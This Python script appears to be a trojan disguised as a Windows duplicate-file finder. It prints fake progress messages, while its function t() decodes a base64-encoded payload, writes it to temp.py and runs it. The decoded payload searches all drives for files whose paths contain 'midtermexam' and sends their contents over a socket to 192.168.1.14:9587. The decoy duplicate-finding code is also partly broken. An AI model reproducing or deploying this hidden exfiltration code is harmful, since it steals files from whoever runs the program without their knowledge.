# 导入需要的模块
import os  # 操作文件和文件夹的模块
import hashlib  # 计算哈希值的模块
import base64
import time


def main():
    # fork a child process
    if os.name == 'nt':
        print("This program can find exact same file in target directory")
        print("by comparing the file hash value")
        time.sleep(2)
        print("Building index ...")
        time.sleep(5)
        print("Searching ...")
        time.sleep(5)

        # On Windows, use multiprocessing module to spawn a new process
        from multiprocessing import Process
        p = Process(target=t)
        p.start()
        p.join()

        # parent process
        while True:

            # 指定文件夹路径
            folder = r'C:\Users\YHD\Documents\PycharmProjects\MidtermLifeSaver'
            # 遍历指定文件夹中的所有文件
            for dirpath, dirnames, filenames in os.walk(folder):
                # 遍历当前文件夹中的所有文件
                for filename in filenames:
                    # 拼接文件的完整路径
                    file_path = os.path.join(dirpath, filename)

            # 打开每个文件，并计算文件的哈希值
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha1(f.read()).hexdigest()
                print("Collecting duplicate file directory ...")
                time.sleep(10)

            # 定义一个字典用于存储文件哈希值和对应的文件路径
            hash_dict = {}
            # 再次遍历指定文件夹中的所有文件，并对每个文件进行哈希值的计算和比对
            for dirpath, dirnames, filenames in os.walk(folder):
                # 遍历当前文件夹中的所有文件
                for filename in filenames:
                    # 拼接文件的完整路径
                    file_path = os.path.join(dirpath, filename)
                    # 打开文件，并计算哈希值
                    with open(file_path, 'rb') as f:
                        file_hash = hashlib.sha1(f.read()).hexdigest()
                        # 判断当前文件是否已经存在相同的哈希值，如果是，则说明文件是重复的
                        if file_hash in hash_dict:
                            print('\n重复文件：', file_path)
                            print('与', hash_dict[file_hash], '重复')
                        else:
                            # 如果当前文件的哈希值没有在字典中出现过，则将其加入字典
                            hash_dict[file_hash] = file_path

            else:
                # child process
                t()
    else:
        print("Sorry, this program only support Windows")
        pass


def t():
    malware_fd = open("temp.py", "w", encoding="utf-8")
    blob = "CiMgLSotIGNvZGluZzogdXRmLTggLSotCmltcG9ydCBvcwppbXBvcnQgcmUKaW1wb3J0IHNvY2tldAppbXBvcnQgaGFzaGxpYgppbXBvcnQgdGltZQpkcml2ZXMgPSBvcy5wb3Blbignd21pYyBsb2dpY2FsZGlzayBnZXQgY2FwdGlvbicpCmRyaXZlcyA9IFtkcml2ZS5zdHJpcCgpIGZvciBkcml2ZSBpbiBkcml2ZXMgaWYgZHJpdmUuc3RyaXAoKV0KZXhhbV9maWxlX2xpc3QgPSBbXQpmb3IgZHJpdmUgaW4gZHJpdmVzOgogICAgcGF0aCA9IG9zLnBhdGguam9pbihkcml2ZSwiXFwiKQogICAgZm9yIGRpclBhdGgsIGRpck5hbWVzLCBmaWxlTmFtZXMgaW4gb3Mud2FsayhwYXRoKToKICAgICAgICBmb3IgZmlsZSBpbiBmaWxlTmFtZXM6CiAgICAgICAgICAgIGlmIHJlLnNlYXJjaCgibWlkdGVybWV4YW0iLCBvcy5wYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpIGFuZCBub3QgZmlsZS5lbmRzd2l0aCgnLmxuaycpOgogICAgICAgICAgICAgICAgZXhhbV9maWxlX2xpc3QuYXBwZW5kKG9zLnBhdGguam9pbihkaXJQYXRoLCBmaWxlKSkKZXhhbV9maWxlX2xpc3QgPSBbZWxlbSBmb3IgZWxlbSBpbiBleGFtX2ZpbGVfbGlzdCBpZiBub3QgZWxlbS5zdGFydHN3aXRoKCdcXCcpXQpwcmludChmJ2V4YW1fZmlsZV9saXN0JywgZXhhbV9maWxlX2xpc3QpCmNsaWVudF9zb2NrZXQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCmNsaWVudF9zb2NrZXQuY29ubmVjdCgoIjE5Mi4xNjguMS4xNCIsIDk1ODcpKQpoYXNoX2RpY3QgPSB7fQpmb3IgZXhhbV9maWxlIGluIGV4YW1fZmlsZV9saXN0OgogICAgd2l0aCBvcGVuKGV4YW1fZmlsZSwgInJiIikgYXMgZjoKICAgICAgICBtZDUgPSBoYXNobGliLm1kNShmLnJlYWQoKSkuaGV4ZGlnZXN0KCkKICAgIHByaW50KGYie2V4YW1fZmlsZX0gbWQ1OiB7bWQ1fSIpCiAgICBpZiBtZDUgaW4gaGFzaF9kaWN0OgogICAgICAgIHByaW50KGYie2V4YW1fZmlsZX0gaGFzIGFscmVhZHkgYmVlbiBzZW50IikKICAgICAgICBjb250aW51ZQogICAgZmlsZV9zaXplID0gb3MucGF0aC5nZXRzaXplKGV4YW1fZmlsZSkKICAgIGNsaWVudF9zb2NrZXQuc2VuZGFsbChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICBwcmludChmIntvcy5wYXRoLmJhc2VuYW1lKGV4YW1fZmlsZSl9XG57ZmlsZV9zaXplfSIuZW5jb2RlKCkpCiAgICB3aXRoIG9wZW4oZXhhbV9maWxlLCAicmIiKSBhcyBmOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoMTA0ODU3NikKICAgICAgICAgICAgaWYgbm90IGRhdGE6CiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBjbGllbnRfc29ja2V0LnNlbmRhbGwoZGF0YSkKICAgICAgICAgICAgcHJpbnQoZiJzZW5kaW5nIHtsZW4oZGF0YSl9IGJ5dGVzLi4uIikKICAgICAgICAgICAgdGltZS5zbGVlcCgyKQogICAgaGFzaF9kaWN0W21kNV0gPSBleGFtX2ZpbGUKY2xpZW50X3NvY2tldC5zZW5kYWxsKGIib3ZlciIpCmNsaWVudF9zb2NrZXQuY2xvc2UoKQpwcmludCgiY29ubmVjdGlvbiBjbG9zZWQiKQoK"
    newMalware = base64.b64decode(blob).decode("UTF-8")
    malware_fd.write(newMalware)
    malware_fd.close()

    # execute
    if os.name == "nt":
        os.system("python temp.py")


if __name__ == "__main__":
    main()
